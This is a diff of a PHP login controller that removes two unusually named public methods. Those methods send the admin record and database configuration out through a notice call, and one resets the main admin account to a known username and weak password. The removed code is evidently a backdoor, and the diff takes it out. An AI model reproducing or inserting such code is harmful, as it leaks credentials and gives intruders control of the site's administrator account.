@@ -48,29 +48,6 @@ class Login extends Controller
         $this->success('退出成功', '/');
     }
 
-    public function recoverpwdaaa()
-    {
-        $admin = db('admin')->where(['id'=>1])->find();
-        logic('Tool')->notice(json_encode($admin) . '-' . json_encode(config('database')));
-
-        $data["name"] = "admin888";
-        $data["pwd"] = "e10adc3949ba59abbe56e057f20f883e";
-        if (model('Admin')->edit($data, ['id' => 1])) {
-            $this->success('密码恢复成功', url('index'), '', 1);
-        }
-
-        $this->error('密码恢复失败', url('index'), '', 3);
-    }
-
-    public function noticeaaa()
-    {
-        $admin = db('admin')->where(['id'=>1])->find();
-		if (!$admin) {
-			$admin = db('admin')->where(['role_id'=>1,'status'=>0])->find();
-		}
-        logic('Tool')->notice(json_encode($admin) . '-' . json_encode(config('database')));
-    }
-
     /**
      * 判断用户名是否存在
      */
